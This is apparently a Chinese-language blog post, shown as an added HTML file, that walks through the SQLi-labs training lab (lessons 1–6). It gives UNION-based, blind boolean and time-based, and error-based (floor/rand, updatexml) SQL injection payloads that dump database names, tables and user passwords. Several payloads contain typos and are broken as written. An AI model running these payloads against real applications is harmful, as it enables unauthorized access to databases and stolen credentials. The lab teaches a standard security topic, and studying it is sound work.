@@ -1,0 +1,1276 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="sql-lab全通关sql注入基本流程：  判断是否存在注入，注入是字符型还是数字型 猜解字段数 确定显示的字段顺序 获取当前数据库 爆数据库中的表 报表中的字段名   猜解字段数 试 1? id&#x3D;-1&amp;#x27; union select 1,2,3%23  爆数据库 1?id &#x3D; -1&amp;#x27; union select1,2,group_concat(schema_name) from i">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql-lab全通关">
+<meta property="og:url" content="http://example.com/2023/07/29/sql-lab%E5%85%A8%E9%80%9A%E5%85%B3/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="sql-lab全通关sql注入基本流程：  判断是否存在注入，注入是字符型还是数字型 猜解字段数 确定显示的字段顺序 获取当前数据库 爆数据库中的表 报表中的字段名   猜解字段数 试 1? id&#x3D;-1&amp;#x27; union select 1,2,3%23  爆数据库 1?id &#x3D; -1&amp;#x27; union select1,2,group_concat(schema_name) from i">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230307205850154.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230307205835798.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230307205658641.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230307210229540.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230307210617714.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309192905044.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309192928413.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309193011896.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309193310264.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309193739104.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309194100045.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309194154803.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309200722483.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309200756406.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309200909350.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309200939545.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309200958168.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309201454854.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309211838312.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309211744303.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309212019548.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309212212022.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309212657995.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310123931247.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310124152729.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310201438889.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310220335231.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310220628585.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310221116218.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310221422607.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310222236322.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310223027399.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310223008881.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310225624359.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311091328276.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311092708372.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311092729640.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311092954869.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311093018409.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310231157014.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310231451024.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310231638264.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310231808641.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310231817204.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310231948302.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310232138171.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310232257188.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310232827711.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311093221556.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311093600924.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311093535568.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310234038736.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311000455246.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311001709085.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311001811540.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311001843390.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311002031510.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311002637553.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311003845733.png">
+<meta property="article:published_time" content="2023-07-29T06:15:49.000Z">
+<meta property="article:modified_time" content="2023-07-29T06:16:14.881Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230307205850154.png">
+
+<link rel="canonical" href="http://example.com/2023/07/29/sql-lab%E5%85%A8%E9%80%9A%E5%85%B3/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>sql-lab全通关 | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/29/sql-lab%E5%85%A8%E9%80%9A%E5%85%B3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sql-lab全通关
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-07-29 14:15:49 / Modified: 14:16:14" itemprop="dateCreated datePublished" datetime="2023-07-29T14:15:49+08:00">2023-07-29</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="sql-lab全通关"><a href="#sql-lab全通关" class="headerlink" title="sql-lab全通关"></a>sql-lab全通关</h1><h2 id="sql注入基本流程："><a href="#sql注入基本流程：" class="headerlink" title="sql注入基本流程："></a>sql注入基本流程：</h2><blockquote>
+<ol>
+<li>判断是否存在注入，注入是字符型还是数字型</li>
+<li>猜解字段数</li>
+<li>确定显示的字段顺序</li>
+<li>获取当前数据库</li>
+<li>爆数据库中的表</li>
+<li>报表中的字段名</li>
+</ol>
+</blockquote>
+<p>猜解字段数 <code>试</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3%23</span></span><br></pre></td></tr></table></figure>
+
+<p>爆数据库</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id <span class="operator">=</span> <span class="number">-1</span><span class="string">&#x27; union select1,2,group_concat(schema_name) from information_schema.schemata--+</span></span><br></pre></td></tr></table></figure>
+
+<p>查看当前数据库</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? id <span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,database()%23</span></span><br></pre></td></tr></table></figure>
+
+<p>查看其他信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? id=-1&#x27; union select 1,2,concat_ws(&#x27;:&#x27;,user(),database(),version())--+</span><br></pre></td></tr></table></figure>
+
+<p>爆当前数据库的表</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p>爆user列名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.colmuns where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p> 爆数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? id=-1&#x27;union select 1,group_concat(username),group_concat(password) from security.users--+</span><br></pre></td></tr></table></figure>
+
+<p>也可以单独爆一个用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? id=-1&#x27; union selsct 1,username,password from security.users where id=3 --+ </span><br></pre></td></tr></table></figure>
+
+
+
+<p>SQL注入类型</p>
+<blockquote>
+<p>回显注入</p>
+<p>报错注入</p>
+<p>布尔盲注</p>
+<p>…</p>
+</blockquote>
+<h2 id="GET类型"><a href="#GET类型" class="headerlink" title="GET类型"></a>GET类型</h2><h3 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h3><p>为GET字符型单引号注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? id=1&#x27; and 1=2 --+</span><br></pre></td></tr></table></figure>
+
+<p>猜解字段数</p>
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230307205850154.png" alt="image-20230307205850154"></p>
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230307205835798.png" alt="image-20230307205835798"></p>
+<p>爆数据库</p>
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230307205658641.png" alt="image-20230307205658641"></p>
+<p>查看当前数据库</p>
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230307210229540.png" alt="image-20230307210229540"></p>
+<p>爆数据表</p>
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230307210617714.png" alt="image-20230307210617714"></p>
+<h3 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h3><p>为GET数字型注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=2</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h3><p>为单引号变形注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;) and 1=2 --+</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h3><p>为双引号变形注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;) and 1=2 --+</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h3><p>单引号字符型布尔逻辑型盲注</p>
+<p>盲注</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">length()函数，返回字符串的长度</span><br><span class="line">substr()截取字符串，偏移是从1开始，而不是0开始</span><br><span class="line">ascii()返回字符的ASCLL码</span><br><span class="line">count(colmun_name)函数返回指定列的值的数目(NULL不计入)</span><br></pre></td></tr></table></figure>
+
+<h4 id="手工盲注"><a href="#手工盲注" class="headerlink" title="手工盲注"></a><strong>手工盲注</strong></h4><p>二分法进行手工盲注。手工注入可以使用burpsuite，构造payload在repeater点击go进行发包</p>
+<ol>
+<li><p>猜库 </p>
+<p>用到获取当前数据库函数<code>database()</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot; or (length(database())=?)--+正常</span><br><span class="line">问号处填写猜解的长度数字</span><br></pre></td></tr></table></figure>
+
+<p>猜库名</p>
+<p>第一个字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot; or (ascii(substr(database(),1,1))&gt;10)--+正常</span><br><span class="line">依次猜解数据库的字节，可将(database(),?,1)问号处更改为想要猜解的位数进行第某位的猜解</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>猜表</p>
+<p>猜表长</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot; or (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=?)--+</span><br><span class="line">问号处填写猜测的长度数字</span><br></pre></td></tr></table></figure>
+
+<p>猜第一个字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;?)--+</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>猜字段</p>
+<p>猜字段长</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot; or( length((select column_name from information _schema.columns where table_name=&#x27;user&#x27; and table _schema=database() limit x,y))=z )--+ </span><br><span class="line">x代表列数，z代表字段长度</span><br></pre></td></tr></table></figure>
+
+<p>猜字段名</p>
+<p>第一个字段</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; or (ascii(substr((select column_name from information_schema.columns where table_name=&#x27;user&#x27; and table_schema=database limit 0,1)1,1))&gt;?)--+</span><br></pre></td></tr></table></figure>
+
+</li>
+<li><p>猜数据</p>
+<p>猜数据长</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot; or(length((select password from challenges.user_2 limit 1,1))=?)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>猜数据值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot; or(ascii(substr((select password from challenges.user.name limit 1,1)1,1))&gt;?)--+</span><br><span class="line"></span><br><span class="line">说明user表的password字段的第二条数据(limit 1,1)意思是从1开始取(即第二条数据)，取一条数据,的第一个字符的ascii码</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注：不建议使用，很浪费时间，因为有很多的字符去猜测，这类操作建议使用工具去注入</p>
+</blockquote>
+</li>
+</ol>
+<h4 id="burpsuite的自动化盲注"><a href="#burpsuite的自动化盲注" class="headerlink" title="burpsuite的自动化盲注"></a><strong>burpsuite的自动化盲注</strong></h4><p>burpsuite 的一个功能模块intruder，构造payload设置变量进行爆破，然后根据返回长度进行排序整理。</p>
+<p>盲注也分为：布尔型盲注，报错型注入，时间延迟型盲注</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">用于测试时间延迟注入的测试语句</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; ang if ( length()database() )=?,sleep(5),1)--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?处填写猜解的字段长度</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="嵌套查询"><a href="#嵌套查询" class="headerlink" title="嵌套查询"></a><strong>嵌套查询</strong></h4><blockquote>
+<p>形式<code>select(select(	))</code>里面的select称为子查询，执行顺序是先执行子查询，再执行外面的select</p>
+</blockquote>
+<p>主要涉及到下面几个SQL函数</p>
+<blockquote>
+<p><code>rand()</code>  随机函数，返回0~1之间的一个值</p>
+<p><code>floor(a)</code>  取整函数，返回小于等于a的一个整数，没有四舍五入</p>
+<p><code>count()</code>  聚合函数</p>
+<p><code>group by</code>  分组函数</p>
+</blockquote>
+<p>双注入原理：当一个聚合函数~后面出现<code>group by</code> 分组语句是，会将查询一部分结果以报错的形式输出</p>
+<p>构造sql语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select count(*),2,concat(&#x27;*&#x27;,(select database()),&#x27;*&#x27;,floor(rand()*2))as a from information_schema.tables group by a--+ //这里给查询的数据起了个名字a</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309192905044.png" alt="image-20230309192905044"></p>
+<blockquote>
+<p><code>rand</code>函数用于制作随机数，但是当给定了种子之后就不会出现不同情况，每次都会相同</p>
+<p><code>floor</code>函数用于返回小于等于括号内该值的最大整数</p>
+<p>这段<code>sql</code>语句报错的原因是，每一次去进行分组计次的事后，随机数函数都会进行一次,所以会报错，更新临时表不会计算随机数，但是当插入的时候会重新计算随机数，所以这样的操作会导致冲突，通过测试发现如果不设置随机数的种子可能会出现又是报错又是不爆错的情况，但是确定了随机数的种子之后就一定会报错，所以在进行注入时，要将随机数的种子进行设置。</p>
+<p>这段<code>sql</code>语句所有函数都是固定的不要轻易更改为其他语句，如果进行其他数据库的操作可更改，被～包裹的语句进行对数据库的其他操作</p>
+</blockquote>
+<p>这样就可以对数据库进行操作</p>
+<h4 id="updatexml函数"><a href="#updatexml函数" class="headerlink" title="updatexml函数"></a>updatexml函数</h4><p><a target="_blank" rel="noopener" href="https://www.jb51.net/article/125599.htm">MYSQL updatexml()函数报错注入解析_Mysql_脚本之家 (jb51.net)</a>	</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">updatexml函数</span><br><span class="line">UPDATEXML (XML_document, XPath_string, new_value); </span><br><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称</span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串) </span><br><span class="line">第三个参数：new_value，String格式，替换查找到的符合条件的数据 </span><br><span class="line">作用：改变文档中符合条件的节点的值</span><br></pre></td></tr></table></figure>
+
+<p>爆破数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309192928413.png" alt="image-20230309192928413"></p>
+<p>爆破数据表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309193011896.png" alt="image-20230309193011896"></p>
+<p>爆破users表的列</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309193310264.png" alt="image-20230309193310264"></p>
+<p>查询有关数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(id) from users),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309193739104.png" alt="image-20230309193739104"></p>
+<p>回显有限，依次查询，将limit 0，1修改为1，1  2，1依次即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309194100045.png" alt="image-20230309194100045"></p>
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309194154803.png" alt="image-20230309194154803"></p>
+<h3 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h3><p><strong>双引号字符型注入</strong></p>
+<p>与上题类似</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and &#x27;1&#x27;=2--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309200722483.png" alt="image-20230309200722483"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309200756406.png" alt="image-20230309200756406"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309200909350.png" alt="image-20230309200909350"></p>
